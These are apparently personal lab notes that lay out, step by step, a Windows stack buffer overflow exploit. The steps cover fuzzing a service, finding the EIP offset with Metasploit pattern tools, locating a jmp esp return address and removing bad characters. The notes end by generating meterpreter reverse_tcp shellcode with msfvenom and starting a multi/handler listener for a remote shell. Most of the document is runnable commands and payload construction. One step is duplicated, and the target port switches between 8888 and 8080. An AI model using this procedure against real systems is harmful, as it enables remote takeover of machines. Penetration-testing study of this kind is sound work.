1. python fuzzer.py 192.168.0.127 8888

2. Examine the last length sent. eg 1075

3. /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 1075

4. Use pattern created into fuzzer-eip-02.py

5. python fuzzer-eip-02.py 192.168.0.127 8080

6. Examine Immunity Debugger EIP addr eg 68B8DF25

7. /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 68B8DF25

8. Edit fuzzer-eip-overwrite-03.py, use the offset output eg 1075 for the number of AAAAAAs eg "A"*1075

9. python fuzzer-eip-overwrite-03.py 192.168.0.127 8888

10a. Use mona.py to find the jmp esp. Search google for instructions. Or
10b. Examine Immunity Debugger for EIP overwritten by "42424242". Under 'Executable Module', click on a dll eg Shell32.dll, under the "CPU main thread, module shell32" window, right click -> 'search for' -> 'command' -> 'jmp esp'. Take note of the jmp esp addr eg 0x7C9D30D7.

, click on a dll eg Shell32.dll, under the "CPU main thread, module shell32" window, right click -> 'search for' -> 'command' -> 'jmp esp'. Take note of the jmp esp addr eg 0x7C9D30D7.

11. Edit fuzzer-eip-jmp-esp-4.py and set the return address backwards eg ret = '\x25\xdf\xb8\x68'. Therefore:

pattern = "A"*1036 + ret + "C"*300 # Our 'exploit' and return address

12. python fuzzer-eip-jmp-esp-4.py 192.168.0.127 8888

13. After Immunity Debugger has crashed, restart it with same attachment, on main menu, 'go to' -> 'expression' -> 68B8DF25. Unpause Immunity Debugger and re-run python fuzzer-eip-jmp-esp-4.py 192.168.0.127 8080. Press F7, make sure it hops to "43" (C buffer)

14. Find bad chars

Edit fuzzer-bad-char-5.py
ret = '\x25\xDF\xB8\x68' 
In Immunity debugger, repeat step 13.
python fuzzer-bad-char-5.py 192.168.0.127 8888

15. Inspect Immunity Debugger at breakpoint, press F7, examine the hex chars from 01 until FF . Remove the offending chars and repeat step 14 until no more bad chars.

16. Create Shellcode!
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.162 LPORT=1990 -f python -b '\x00\x0a\x0d'

17. Place the shellcode into exploit2-6.py and run listener on 1990
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.0.162
set LPORT 1990
run

python exploit2-6.py 192.168.0.127 8888

18. done

